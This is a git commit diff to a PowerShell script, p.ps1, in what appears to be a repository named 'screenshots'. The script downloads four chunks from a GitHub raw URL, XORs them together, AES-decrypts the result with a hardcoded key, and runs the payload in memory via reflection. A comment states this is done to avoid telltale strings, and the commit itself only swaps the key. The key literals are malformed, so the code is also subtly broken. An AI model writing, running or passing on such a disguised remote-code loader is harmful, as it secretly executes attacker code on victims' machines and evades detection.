08f993d95275d77ad0002f6c4639d5816f5ac103
cem324 <hvpauxr102@hotmail.com>
2026-09-22 11:30:22 +0000

    Update p.ps1

--- p.ps1
+++ p.ps1
@@ -1,7 +1,7 @@
 $b='https://raw.githubusercontent.com/cem324/screenshots/main'
 $ch=@();0..3|%{$u="$b/c$_";try{$ch+=([Net.WebClient]::new()).DownloadData($u)}catch{$w=New-Object -Com WinHttp.WinHttpRequest;$w.Open('GET',$u,0);$w.Send();$ch+=[byte[]]$w.ResponseBody}}
 $xr=[byte[]]$ch[0].Clone();1..3|%{$i=$_;0..($xr.Length-1)|%{$xr[$_]=$xr[$_]-bxor$ch[$i][$_]}}
-$ak=[Byte[]]@(0xb'fM',0xb'\n\xf5',0xb'?\xbe',0xb'\xfdR',0xb'\xeb\x0f',0xb'\x97E',0xb'\x1e\x98',0xb'\xec\x1e',0xb'',0xb'',0xb'',0xb'',0xb'',0xb'',0xb'',0xb'')
+$ak=[Byte[]]@(0xb'\xa9\x9b',0xb'\x15\xbf',0xb'.\xe7',0xb'\xa2\xd4',0xb'w\x14',0xb'\xa4\xe1',0xb'\xc0\x9d',0xb'\xdb\xeb',0xb'',0xb'',0xb'',0xb'',0xb'',0xb'',0xb'',0xb'')
 $iv=[byte[]]$xr[0..15];$ae=[Security.Cryptography.Aes]::Create();$ae.Key=$ak;$ae.IV=$iv;$py=$ae.CreateDecryptor().TransformFinalBlock($xr,16,$xr.Length-16)
 # Execute via reflection — no Add-Type, no static DllImport strings
 $rt=[Type]$py[0];[System.Reflection.Assembly]::Load($py).EntryPoint.Invoke(0,@(,$null))
